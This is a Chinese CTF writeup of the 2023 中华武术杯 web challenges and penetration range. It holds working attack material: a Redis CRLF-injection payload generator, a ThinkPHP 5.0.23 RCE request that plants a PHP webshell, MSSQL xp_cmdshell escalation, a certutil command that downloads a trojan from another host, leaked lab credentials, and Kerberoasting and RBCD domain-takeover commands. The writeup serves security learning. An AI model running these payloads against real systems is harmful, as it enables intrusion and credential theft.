---
title: "2023 中华武术杯 Web Writeup"
date: 2023-10-17T21:24:23+08:00
lastmod: 2023-10-17T21:24:23+08:00
draft: false
author: "X1r0z"

tags: ['awdp', 'domain', 'windows', 'mssql']
categories: ['Writeup']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

2023 中华武术杯 Web Writeup (AWDP + 靶场)

<!--more-->

## AWDP

### Aerocrafts

fastjson 1.2.83 + redis

auth 路由传入 password 的时候没有限制 CRLF 字符, 所以可以注入任意 redis 命令

![image-20231017162840634](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202310171628730.png)

`\r\n` 只替换了一次, 双写就可以绕过

```python
def gen_payload(payload):

    redis_payload = ''

    for i in payload.split('\n'):
        arg_num = '*' + str(len(i.split(' ')))
        redis_payload += arg_num + '\r\r\n\n'
        for j in i.split(' '):
            arg_len = '$' + str(len(j))
            redis_payload += arg_len + '\r\r\n\n'
            redis_payload += j + '\r\r\n\n'
    
    return redis_payload
```

之后感觉是要往 redis 里面写 fastjson payload, 然后在 get cache 的时候触发 fastjson 反序列化, 但是 fastjson 1.2.83 目前没啥思路

patch 倒是比较简单, 直接 ban 掉 `\r\n` 字符

```java
public class RedisMonitor {
  private static final String IP_ADDRESS = "127.0.0.1";
  
  private static final Integer SERVER_PORT = Integer.valueOf(6379);
  
  private static Socket scoket;
  
  private static OutputStream outputStream;
  
  private static InputStream inputStream;
  
  static {
    try {
      scoket = new Socket("127.0.0.1", SERVER_PORT.intValue());
      outputStream = scoket.getOutputStream();
      inputStream = scoket.getInputStream();
    } catch (IOException e) {
      e.printStackTrace();
    } 
  }
  
  public static String auth(String password) throws IOException {
    String passlength;
    if (password.contains("\r")) {
      passlength = String.valueOf(password.substring(0, password.indexOf("\r")).length());
    } else {
      passlength = String.valueOf(password.length());
    } 
    if (password.contains("\r"))
      return ""; 
    if (password.contains("\n"))
      return ""; 
    if (password.contains("\r\n"))
      return ""; 
    String sendInfo = "*2\r\n$4\r\nauth\r\n$" + passlength + "\r\n" + password.replace("\r\n", "") + "\r\n";
    System.out.println(sendInfo);
    outputStream.write(sendInfo.getBytes());
    byte[] responseByte = new byte[1024];
    int length = inputStream.read(responseByte);
    return new String(responseByte, 0, length);
  }
  
  public static String ping() throws IOException {
    String sendInfo = "*1\r\n$4\r\nping\r\n";
    outputStream.write(sendInfo.getBytes());
    byte[] responseByte = new byte[1024];
    int length = inputStream.read(responseByte);
    return new String(responseByte, 0, length);
  }
  
  public static Boolean close() throws IOException {
    inputStream.close();
    outputStream.close();
    scoket.close();
    return Boolean.valueOf(true);
  }
}
```

### tp

自己之前挖了一个 SQL 注入结合缓存文件 getshell 的方法, 结果这道题 thinkphp 的目录在 web 目录外面, 没办法利用, 预期应该是反序列化?

patch 也比较简单, 限制 cid 不能为数组

```php
<?php
namespace Home\Controller;

use Think\Controller;

class IndexController extends Controller
{
    public function index()
    {
        $cid = I('cid', 0,'intval');
        if($cid == 0) $this->show('<style type="text/css">*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} body{ background: #fff; font-family: "微软雅黑"; color: #333;font-size:24px} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.8em; font-size: 36px } a,a:hover{color:blue;}</style><div style="padding: 24px 48px;"> <h1>:)</h1><p>欢迎使用 <b>ThinkPHP</b>！</p><br/>版本 V{$Think.version}</div><script type="text/javascript" src="http://ad.topthink.com/Public/static/client.js"></script><thinkad id="ad_55e75dfae343f5a1"></thinkad><script type="text/javascript" src="http://tajs.qq.com/stats?sId=9347272" charset="UTF-8"></script>','utf-8');
        else {
            $this->page($cid);
        }
    }
    public function page($cid = 0){
        if (is_array($cid)) {
            $this->show('<style type="text/css">*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} body{ background: #fff; font-family: "微软雅黑"; color: #333;font-size:24px} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.8em; font-size: 36px } a,a:hover{color:blue;}</style><div style="padding: 24px 48px;"> <h1>:)</h1><p>欢迎使用 <b>ThinkPHP</b>！</p><br/>版本 V{$Think.version}</div><script type="text/javascript" src="http://ad.topthink.com/Public/static/client.js"></script><thinkad id="ad_55e75dfae343f5a1"></thinkad><script type="text/javascript" src="http://tajs.qq.com/stats?sId=9347272" charset="UTF-8"></script>','utf-8');
        } else {
            if($cid == 0) $this->error('error');
            $content = M('Articles')->Field('content')->find($cid);
            $this->show(base64_encode($content['content']),'utf-8');
        }
	}
}
```

### phpok

hint 提示要找 SQL 注入

参考文章: [https://www.hacking8.com/bug-web/PHPOK/PHPOK-5.3-前台注入.html](https://www.hacking8.com/bug-web/PHPOK/PHPOK-5.3-%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5.html)

写了个脚本跑出来用户名是 `admin_phpok`, 密码 md5 解密不出来

patch 听说是去网上找新版的补丁包然后直接替换

## 靶场

靶场部分很有意思, 可惜对 K8s 和 .NET 不是很熟, 然后到后面打域控的时间不太够了 (

最终靶场成绩为全场第1名

![4238701B-9089-47AD-9F8B-CE5789EB39E5](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202310172133947.png)

### 节点1 - Redis (公网)

fscan

```
   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.2
start infoscan
trying RunIcmp2
The current user permissions unable to send icmp packets
start ping
(icmp) Target 39.98.113.230   is alive
[*] Icmp alive hosts len is: 1
39.98.113.230:6379 open
39.98.113.230:21 open
39.98.113.230:22 open
39.98.113.230:80 open
[*] alive ports len is: 4
start vulscan
[*] WebTitle: http://39.98.113.230      code:200 len:4833   title:Welcome to CentOS
[+] Redis:39.98.113.230:6379 unauthorized file:/usr/local/redis/db/dump.rdb
[+] ftp://39.98.113.230:21:anonymous
   [->]pub
已完成 4/4
[*] 扫描结束,耗时: 32.953197666s
```

6379 未授权, 直接打 redis 主从复制 rce

查看 SUID

```bash
$ find / -perm -u=s -type f 2>/dev/null
/usr/sbin/pam_timestamp_check
/usr/sbin/usernetctl
/usr/sbin/unix_chkpwd
/usr/bin/at
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chage
/usr/bin/umount
/usr/bin/su
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/crontab
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/pkexec
/usr/libexec/dbus-1/dbus-daemon-launch-helper
/usr/lib/polkit-1/polkit-agent-helper-1
```

在这里卡了一会, 最后执行 `sudo -l` 才发现可以免密码执行 cmp 命令

```bash
User redis may run the following commands on redis:
    (root) NOPASSWD: /usr/bin/cmp
```

查看 flag

```bash
sudo cmp /flag02.txt /dev/zero -b -l
```

### 节点2 - WIN-OPS8063

redis 内网信息

```bash
$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.22.14.57  netmask 255.255.0.0  broadcast 172.22.255.255
        inet6 fe80::216:3eff:fe1c:b318  prefixlen 64  scopeid 0x20<link>
        ether 00:16:3e:1c:b3:18  txqueuelen 1000  (Ethernet)
        RX packets 164991  bytes 153065335 (145.9 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 72917  bytes 25632190 (24.4 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 12  bytes 679 (679.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 12  bytes 679 (679.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

内网 fscan

```bash
$ ./fscan -h 172.22.14.0/24

   ___                              _    
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.2
start infoscan
trying RunIcmp2
The current user permissions unable to send icmp packets
start ping
(icmp) Target 172.22.14.34    is alive
(icmp) Target 172.22.14.37    is alive
(icmp) Target 172.22.14.25    is alive
(icmp) Target 172.22.14.57    is alive
(icmp) Target 172.22.14.59    is alive
[*] Icmp alive hosts len is: 5
172.22.14.59:8080 open
172.22.14.57:6379 open
172.22.14.59:3306 open
172.22.14.59:445 open
172.22.14.34:1433 open
172.22.14.25:445 open
172.22.14.34:445 open
172.22.14.59:139 open
172.22.14.25:139 open
172.22.14.59:135 open
172.22.14.34:139 open
172.22.14.25:135 open
172.22.14.34:135 open
172.22.14.59:80 open
172.22.14.37:80 open
172.22.14.25:80 open
172.22.14.34:80 open
172.22.14.57:80 open
172.22.14.59:21 open
172.22.14.37:22 open
172.22.14.57:22 open
172.22.14.57:21 open
172.22.14.37:2379 open
172.22.14.25:8081 open
172.22.14.25:8172 open
172.22.14.37:10250 open
[*] alive ports len is: 26
start vulscan
[*] NetInfo:
[*]172.22.14.25
   [->]WIN-WEB2016
   [->]172.22.14.25
   [->]2001:0:348b:fb58:1014:30fa:d89d:91db
[*] NetInfo:
[*]172.22.14.59
   [->]WIN-OPS8063
   [->]172.22.14.59
[*] NetBios: 172.22.14.25    WORKGROUP\WIN-WEB2016               Windows Server 2016 Datacenter 14393
[*] WebTitle: http://172.22.14.37       code:403 len:277    title:403 Forbidden
[*] WebTitle: http://172.22.14.57       code:200 len:4833   title:Welcome to CentOS
[*] NetInfo:
[*]172.22.14.34
   [->]WIN-MSSQL
   [->]172.22.14.34
[*] WebTitle: http://172.22.14.25       code:200 len:16896  title:None
[*] NetBios: 172.22.14.34    WORKGROUP\WIN-MSSQL                 Windows Server 2016 Datacenter 14393
[*] NetBios: 172.22.14.59    WORKGROUP\WIN-OPS8063               Windows Server 2016 Datacenter 14393
[*] WebTitle: http://172.22.14.34       code:404 len:315    title:Not Found
[+] ftp://172.22.14.57:21:anonymous 
   [->]pub
[*] WebTitle: http://172.22.14.25:8081  code:302 len:131    title:Object moved 跳转url: http://172.22.14.25:8081/Admin?url=%2F
[*] WebTitle: https://172.22.14.37:10250 code:404 len:19     title:None
[*] WebTitle: http://172.22.14.25:8081/Admin?url=%2F code:200 len:3184   title:Login - 我的 ASP.NET 应用程序
[+] ftp://172.22.14.59:21:anonymous 
   [->].htaccess
   [->]favicon.ico
   [->]index.php
   [->]nginx.htaccess
   [->]robots.txt
   [->]router.php
[*] WebTitle: http://172.22.14.59:8080  code:200 len:703    title:IIS Windows Server
[*] WebTitle: http://172.22.14.59       code:200 len:5581   title:Bootstrap Material Admin
[*] WebTitle: https://172.22.14.25:8172 code:404 len:0      title:None
[+] http://172.22.14.59 poc-yaml-thinkphp5023-method-rce poc1
```

整理信息

```
172.22.14.34 1433 80 WIN-MSSQL
172.22.14.37 80,10250,2379
172.22.14.25 80,8081,8172 WIN-WEB2016 asp.net
172.22.14.57 本机
172.22.14.59 8080,3306 WIN-OPS8063
```

172.22.14.59 直接打 thinkphp 5.0.23 rce (注意是 windows 机器)

```http
POST /index.php?s=captcha HTTP/1.1
Host: 172.22.14.59
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.46
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 116

_method=__construct&filter[]=shell_exec&method=get&server[REQUEST_METHOD]=echo ^<?php eval($_REQUEST[1]);?^> > a.php
```

phpStudy 直接就是 system 权限, flag 在 `C:\Users\Administrator\flag\` 目录

### 节点3 - SQLSERVER

在 Administrator 的桌面上发现了内部通知, 内部通讯录以及 SafetyGuardSystem 源码 (对应公网 WEB01)

内部通知

```
尊敬的所有员工，

为了加强公司网络的安全性，我们需要进行一项重要的内部审核。此次审核旨在确保所有计算机用户都正确对应了员工姓名，并且在需要的情况下设置了SPN（服务主体名称）。SPN的设置对于网络安全至关重要，因此我们需要确保它们被妥善配置，以防止潜在的安全漏洞。

请您务必在以下截止日期之前完成以下任务：

检查您的计算机用户信息：

请登录您的计算机，然后在公司网络中访问以下链接（或按照您所在部门的指示进行操作），以验证您的计算机用户是否正确对应了您的员工姓名。
检查SPN设置：

如果您的计算机用户设置了SPN，请确保不要将其密码设为弱口令。强烈建议您使用复杂、独特且难以破解的密码来保护您的账户。
报告检查结果：

请将您的检查结果在截止日期之前报告给我，以便我们能够对网络安全性做出必要的改进。如果您需要协助或有任何疑问，请随时联系我们的IT支持团队。
截止日期：[填写截止日期]

您的合作对于确保公司网络的安全至关重要。我们感谢您的支持和积极参与。

谢谢！

[您的姓名]
[您的职务]
[部门名称]
```

内部通讯录里面有用户名和邮箱, 猜测后面是要 AS-REP Roasting 或者 Kerberoasting

在 SafetyGuardSystem 的 Web.config 内翻到了 MSSQL 连接信息

```xml
<connectionStrings>
  <add name="SafetyModel" connectionString="data source=WIN-MSSQL;initial catalog=SafetyGuardDB;user id=safetyuser;password=sAf*tyI@8JkQ;MultipleActiveResultSets=True;App=EntityFramework" providerName="System.Data.SqlClient" />
  <add name="AdminModel" connectionString="data source=WIN-MSSQL;initial catalog=SafetyGuardDB;user id=safetyuser;password=sAf*tyI@8JkQ;multipleactiveresultsets=True;application name=EntityFramework" providerName="System.Data.SqlClient" />
</connectionStrings>
```

连过去发现 safetyuser 用户不是 DBA 权限, 无法直接执行 xp_cmdshell

参考文章: [https://xz.aliyun.com/t/11937](https://xz.aliyun.com/t/11937)

因为之前对 MSSQL 稍微有些了解, 所以脑洞了一下感觉可能有 Impersonate 的权限

查看当前用户是否可以模拟其它用户

```sql
SELECT DISTINCT b.name 
FROM sys.server_permissions a 
INNER JOIN sys.server_principals b 
ON a.grantor_principal_id = b.principal_id 
WHERE a.permission_name = 'IMPERSONATE';
```

![image-20231017171106581](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202310171711687.png)

直接模拟 sa, 然后 xp_cmdshell 执行命令

```sql
EXECUTE AS LOGIN = 'sa';

EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

EXEC master..xp_cmdshell 'whoami';
```

certutil 下载木马上线 viper

```cmd
certutil -urlcache -split -f http://172.22.14.59/yy.exe C:\Users\Public\yy.exe
```

SweetPotato 提权

![image-20231017172649448](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202310171726557.png)

### 节点4 - WEB01 (公网)

fscan

```bash
$ fscan ./fscan_darwin_arm64 -h 39.98.110.36

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.2
start infoscan
trying RunIcmp2
The current user permissions unable to send icmp packets
start ping
(icmp) Target 39.98.110.36    is alive
[*] Icmp alive hosts len is: 1
39.98.110.36:80 open
39.98.110.36:8172 open
39.98.110.36:8081 open
[*] alive ports len is: 3
start vulscan
[*] WebTitle: http://39.98.110.36:8081  code:302 len:131    title:Object moved 跳转url: http://39.98.110.36:8081/Admin?url=%2F
[*] WebTitle: http://39.98.110.36       code:200 len:16896  title:None
[*] WebTitle: https://39.98.110.36:8172 code:404 len:0      title:None
[*] WebTitle: http://39.98.110.36:8081/Admin?url=%2F code:200 len:3184   title:Login - 我的 ASP.NET 应用程序
已完成 3/3
[*] 扫描结束,耗时: 38.860471167s
```

后台弱口令 admin/123456

然后把源码里的 SafetyGuardSystem.dll 拖了下来, 反编译发现了一个 FileController

```csharp
using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Web;
using System.Web.Mvc;

namespace SafetyGuardSystem.Controllers
{
	// Token: 0x02000011 RID: 17
	public class FileController : DefaultController
	{
		// Token: 0x06000054 RID: 84 RVA: 0x00002C08 File Offset: 0x00000E08
		[HttpGet]
		public ActionResult GetFiles(string directoryPath)
		{
			JsonResult jsonResult = new JsonResult();
			jsonResult.JsonRequestBehavior = 0;
			ActionResult actionResult;
			try
			{
				string text = Path.Combine("your_base_directory", directoryPath);
				if (!Directory.Exists(text))
				{
					actionResult = this.HttpNotFound("Directory not found");
				}
				else
				{
					string[] directories = Directory.GetDirectories(text);
					string[] files = Directory.GetFiles(text);
					jsonResult.Data = new object[]
					{
						new { directories, files }
					};
					actionResult = jsonResult;
				}
			}
			catch (Exception ex)
			{
				jsonResult.Data = new object[]
				{
					new
					{
						Status = "Error",
						Message = ex.Message
					}
				};
				actionResult = jsonResult;
			}
			return actionResult;
		}

		// Token: 0x06000055 RID: 85 RVA: 0x00002CA8 File Offset: 0x00000EA8
		[HttpGet]
		public ActionResult Backup()
		{
			JsonResult jsonResult = new JsonResult();
			jsonResult.JsonRequestBehavior = 0;
			ActionResult actionResult;
			try
			{
				string text = base.Server.MapPath("~/Upload");
				DateTime utcNow = DateTime.UtcNow;
				string text2 = utcNow.ToUnixTimeSeconds().ToString() + ".zip";
				string text3 = Path.Combine(base.Server.MapPath("~/Backup"), text2);
				ZipFile.CreateFromDirectory(text, text3);
				if (!File.Exists(text3))
				{
					actionResult = this.HttpNotFound("File not found");
				}
				else
				{
					string text4 = "application/octet-stream";
					FileContentResult fileContentResult = new FileContentResult(File.ReadAllBytes(text3), text4)
					{
						FileDownloadName = Path.GetFileName(text2)
					};
					actionResult = fileContentResult;
				}
			}
			catch (Exception ex)
			{
				jsonResult.Data = new object[]
				{
					new
					{
						Status = "Error",
						Message = ex.Message
					}
				};
				actionResult = jsonResult;
			}
			return actionResult;
		}

		// Token: 0x06000056 RID: 86 RVA: 0x00002D98 File Offset: 0x00000F98
		[HttpPost]
		[ValidateAntiForgeryToken]
		public ActionResult Restore(HttpPostedFileBase restoreFile)
		{
			JsonResult jsonResult = new JsonResult();
			jsonResult.JsonRequestBehavior = 0;
			string[] array = new string[] { ".jpg", ".jpeg", ".png", ".gif", ".pdf", ".doc", ".docx", ".mp4" };
			ActionResult actionResult;
			try
			{
				string text = base.Server.MapPath("~/Upload");
				if (restoreFile != null && restoreFile.ContentLength > 0)
				{
					string fileName = Path.GetFileName(restoreFile.FileName);
					string text2 = Path.GetExtension(restoreFile.FileName).ToLower();
					if (text2 != ".zip")
					{
						jsonResult.Data = new object[]
						{
							new
							{
								Status = "Error",
								Message = "File type forbidden"
							}
						};
						return jsonResult;
					}
					string text3 = Path.Combine(base.Server.MapPath("~/RestoreTemp"), fileName);
					restoreFile.SaveAs(text3);
					using (ZipArchive zipArchive = ZipFile.OpenRead(text3))
					{
						using (IEnumerator<ZipArchiveEntry> enumerator = zipArchive.Entries.GetEnumerator())
						{
							if (enumerator.MoveNext())
							{
								ZipArchiveEntry zipArchiveEntry = enumerator.Current;
								if (!Enumerable.Contains<string>(array, Path.GetExtension(zipArchiveEntry.FullName).ToLower()))
								{
									jsonResult.Data = new object[]
									{
										new
										{
											Status = "Error",
											Message = "File type forbidden in zip"
										}
									};
									return jsonResult;
								}
							}
						}
					}
					ZipFile.ExtractToDirectory(text3, text);
				}
				jsonResult.Data = new object[]
				{
					new
					{
						Status = "Ok",
						Message = "Upload directory has been restored"
					}
				};
				actionResult = jsonResult;
			}
			catch (Exception ex)
			{
				jsonResult.Data = new object[]
				{
					new
					{
						Status = "Error",
						Message = ex.Message
					}
				};
				actionResult = jsonResult;
			}
			return actionResult;
		}
	}
}
```

GetFiles 可以列任意目录, 但无法下载, Backup 和 Restore 对应压缩和解压缩的功能

一时半会还没怎么想好怎么利用, 可能是 Zip Slip?

### 节点5 - K8S

fscan

```bash
$ ./fscan -h 172.22.14.37 -p 1-65535

   ___                              _    
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.2
start infoscan
trying RunIcmp2
The current user permissions unable to send icmp packets
start ping
(icmp) Target 172.22.14.37    is alive
[*] Icmp alive hosts len is: 1
172.22.14.37:22 open
172.22.14.37:80 open
172.22.14.37:2379 open
172.22.14.37:2380 open
172.22.14.37:6443 open
172.22.14.37:10250 open
172.22.14.37:10251 open
172.22.14.37:10256 open
172.22.14.37:10252 open
[*] alive ports len is: 9
start vulscan
[*] WebTitle: http://172.22.14.37       code:403 len:277    title:403 Forbidden
[*] WebTitle: http://172.22.14.37:10252 code:404 len:19     title:None
[*] WebTitle: http://172.22.14.37:10251 code:404 len:19     title:None
[*] WebTitle: https://172.22.14.37:10250 code:404 len:19     title:None
[*] WebTitle: http://172.22.14.37:10256 code:404 len:19     title:None
[*] WebTitle: https://172.22.14.37:6443 code:200 len:4671   title:None
[+] https://172.22.14.37:6443 poc-yaml-go-pprof-leak 
[+] https://172.22.14.37:6443 poc-yaml-kubernetes-unauth 
```

6443 k8s api server 未授权

参考文章: [https://zone.huoxian.cn/d/1153-k8s](https://zone.huoxian.cn/d/1153-k8s)

好久没碰了, 对 K8s 不是很熟

首先 kubectl 执行任何操作都提示 `You must be logged in to the server`

```bash
proxychains kubectl -s https://172.22.14.37:6443/ --insecure-skip-tls-verify=true get pods
```

但是直接浏览器访问对应的 api, 比如 `/api/v1/namespaces/defaults/pods` 却能正常显示, 很怪

后面用了文章中的方式, 通过 http post 请求 api 来部署 pod, 确实能部署成功, 但是无法通过 kubectl attach pod

在这块卡了很长时间, 没啥思路, 也想过直接在 pod 创建的时候往 command 里面塞命令, 结果不出网

writeup 写到这里的时候本来想写 "因为 pod 的网络是隔离的所以也不太好外带回显到内网中的其它机器", 结果突然想起来其实可以设置 hostNetwork, 直接使用宿主机的网络, 当时怎么没想到 (

### 节点6 - WIN-8087

因为前面在 K8s 那块卡了很长时间, 所以导致最后打域的时间其实也就只有 30 多分钟, 不过好在后面的过程还算顺利

hint 提示办公区在 37 段

fscan

```bash
$ ./fscan -h 172.22.37.0/24

   ___                              _    
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.2
start infoscan
trying RunIcmp2
The current user permissions unable to send icmp packets
start ping
(icmp) Target 172.22.37.26    is alive
(icmp) Target 172.22.37.29    is alive
(icmp) Target 172.22.37.13    is alive
[*] Icmp alive hosts len is: 3
172.22.37.26:445 open
172.22.37.13:445 open
172.22.37.29:445 open
172.22.37.26:21 open
172.22.37.13:139 open
172.22.37.26:139 open
172.22.37.29:139 open
172.22.37.13:135 open
172.22.37.29:135 open
172.22.37.26:135 open
172.22.37.13:88 open
[*] alive ports len is: 11
start vulscan
[*] NetInfo:
[*]172.22.37.13
   [->]DC01
   [->]172.22.37.13
[*] NetInfo:
[*]172.22.37.29
   [->]WIN-8087
   [->]172.22.37.29
[*] NetInfo:
[*]172.22.37.26
   [->]WIN-8083
   [->]172.22.37.26
[*] 172.22.37.13  (Windows Server 2016 Datacenter 14393)
[*] NetBios: 172.22.37.26    WIN-8083.codecraft.local            Windows Server 2016 Datacenter 14393
[*] NetBios: 172.22.37.29    WIN-8087.codecraft.local            Windows Server 2016 Datacenter 14393
[*] NetBios: 172.22.37.13    [+] DC:DC01.codecraft.local          Windows Server 2016 Datacenter 14393
[+] ftp://172.22.37.26:21:anonymous 
   [->]Management Users.txt
```

首先根据前面的内部通讯录用 kerbrute 跑了一遍 AS-REP Roasting, 不过没啥结果

然后发现 172.22.37.26 ftp 可以匿名登录, 存在 Management Users.txt

```
张颖
运维部
zhangying@codecraft.local
18500005973

User:  zhangying
Group: WIN-8083\Remote Management Users, WIN-8083\Remote Desktop Users
Pass:  OsVhi2FcMK5
```

先用 zhangying rdp 连接到 WIN-8083, 运行 SharpHound 收集域内信息

对 zhangying 进行分析的时候发现 zhangfei 位于 Account Operators 组

![image-20231017204030604](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202310172040832.png)

然后用 zhangying 的凭据跑了一遍 SPN

```bash
proxychains getUserSPNs.py codecraft.local/zhangying:'OsVhi2FcMK5' -dc-ip 172.22.37.13 -request-user zhangfei
```

![image-20231017204116698](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202310172041911.png)

导出 zhangfei 的 SPN Hash, hashcat 跑 rockyou.txt

```bash
hashcat -a 0 -m 13100 zhangfei.hash rockyou.txt
```

密码为 elizabeth

因为 zhangfei 属于 Account Operators 组, 所以可以为域内任意非域控机器配置基于资源的约束委派 (RBCD)

先添加机器账户

```bash
proxychains addcomputer.py codecraft.local/zhangfei:'elizabeth' -dc-ip 172.22.37.13 -dc-host codecraft.local -computer-name 'TEST$' -computer-pass 'P@ssw0rd'
```

为 WIN-8087 配置 RBCD

```bash
proxychains rbcd.py codecraft.local/zhangfei:'elizabeth' -dc-ip 172.22.37.13 -action write -delegate-to 'WIN-8087$' -delegate-from 'TEST$'
```

申请 ST

```bash
getST.py -dc-ip 172.22.37.13 -spn cifs/WIN-8087.codecraft.local -impersonate Administrator codecraft.local/'TEST$':'P@ssw0rd'
```

psexec 拿 flag

```bash
export KRB5CCNAME=Administrator.ccache
psexec.py -no-pass -k WIN-8087.codecraft.local -dc-ip 172.22.37.13
```

后来发现 wangwei 对 WIN-8087 具有 GenericWrite 权限, 因此用 wangwei 也能打

![image-20231017210235162](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202310172102402.png)

### 节点7 - DC01

当时没啥时间打域控了, 后来看了一下感觉好像也不是很难

zhangfei 可以 PSRemote 到 DC01, 其实也就是 WinRM

![image-20231017205149482](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202310172051718.png)

Account Operators 对 Exchange Trusted Subsystem 组具有 GenericAll 权限

![image-20231017210445091](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202310172104329.png)

Exchange Trusted Subsystem 属于 Exchange Windows Permissions 组, 后者有权限修改域内所有账户的 DACL

这个我们其实也很熟悉, 例如安装 Exchange Server 的机器就属于这个组, NTLM Relay 就有结合 Exchange 机器账户为域内某个用户写 DCSync 权限的打法

因此思路就是将某个机器账户加入 Exchange Trusted Subsystem 组, 然后通过这个机器账户的权限为某个用户或者该机器账户本身配置 DCSync, 最后通过 DCSync 拉取域管的 Hash, psexec 到域控拿到 flag

当然既然有了 WriteDacl (其实也就相当于有了 GenericWrite) 权限, 也可以为域控配置 RBCD, 方法和上面类似

### 节点8 - WIN-8083

跟 WIN-8087 类似, 为 WIN-8083 配置 RBCD, 不过听说是非预期 (

```bash
proxychains rbcd.py codecraft.local/zhangfei:'elizabeth' -dc-ip 172.22.37.13 -action write -delegate-to 'WIN-8083$' -delegate-from 'TEST$'

getST.py -dc-ip 172.22.37.13 -spn cifs/WIN-8083.codecraft.local -impersonate Administrator codecraft.local/'TEST$':'P@ssw0rd'

export KRB5CCNAME=Administrator.ccache
psexec.py -no-pass -k WIN-8083.codecraft.local -dc-ip 172.22.37.13
```

![image-20231017210525283](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202310172105526.png)